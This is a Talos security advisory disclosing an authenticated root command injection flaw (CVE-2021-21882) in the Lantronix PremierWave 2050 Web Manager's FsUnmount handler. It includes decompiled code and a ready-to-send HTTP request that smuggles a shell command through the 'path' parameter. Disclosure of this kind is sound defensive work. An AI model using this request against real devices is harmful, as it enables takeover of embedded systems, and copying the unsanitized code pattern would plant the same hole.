# Talos Vulnerability Report

### TALOS-2021-1326

## Lantronix PremierWave 2050 Web Manager FsUnmount OS command injection vulnerability

##### November 15, 2021

##### CVE Number

CVE-2021-21882

### Summary

An OS command injection vulnerability exists in the Web Manager FsUnmount functionality of Lantronix PremierWave 2050 8.9.0.0R4. A specially-crafted HTTP request can lead to arbitrary command execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.

### Tested Versions

Lantronix PremierWave 2050 8.9.0.0R4 (in QEMU)

### Product URLs

<https://www.lantronix.com/products/premierwave2050/>

### CVSSv3 Score

9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

### Details

PremierWave 2050 is an embedded Wi-Fi Module manufactured by Lantronix.

The PremierWave 2050 Web Manager interface allows an authenticated, but unprivileged, user to unmount USB mount points. This functionality is implemented using two exploitable `system` calls to `/sbin/ltrx_usb_umount` and `mount`. The underlying commands are built using an unsanitized attacker-controlled HTTP parameter, `path`. This command is executed with root privileges.

The relevant portion of the function responsible for handling the ajax function `FsUnmount` is partially included below.

```
...
dir = get_param_by_name("dir");
path = get_param_by_name("path");
sprintf((char *)mount_point, "%s%s", "/ltrx_user", path);
if ( !IseUSB(path) )                                                                    [1]
{
    cmd = sprintf_malloc("/sbin/ltrx_usb_umount '%s'", (const char *)mount_point);      [2]
    exec_system_cmd_print(cmd, 0, 0);
    ...
 }
 ...

```

At position [1] there is a function call to `IseUSB` which similarly relies on various `system` calls out to secondary applications via system. The relevant portion of the `IseUSB` function is included below.

```
int IseUSB(char* path) {
    ...
    cmd = sprintf_malloc("mount 2>/dev/null | grep 'on %s type' | awk '{print $1}' | tr -d '\n'", a1);
    exec_system_cmd_ex(cmd, &result, &num_bytes);
    ...
    cmd = sprintf_malloc("e2label %s 2>/dev/null | tr -d '\n'", result);
    ...
    exec_system_cmd_ex(v3, &result, num_bytes);
    ...
}

```

An attacker who submits a properly-formed HTTP `path` parameter can escape two of the shell commands and execute arbitrary OS commands with root privileges.

```
POST / HTTP/1.1
Host: [IP]:[PORT]
Content-Length: 37
Authorization: Basic dXNlcjp1c2Vy
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

ajax=FsUnmount&dir=/&path='; whoami #

```

The above HTTP request will cause the following commands to be executed with root privilege:

```
/sbin/ltrx_usb_umount ''; whoami #
mount 2>/dev/null | grep 'on '; whoami #

```
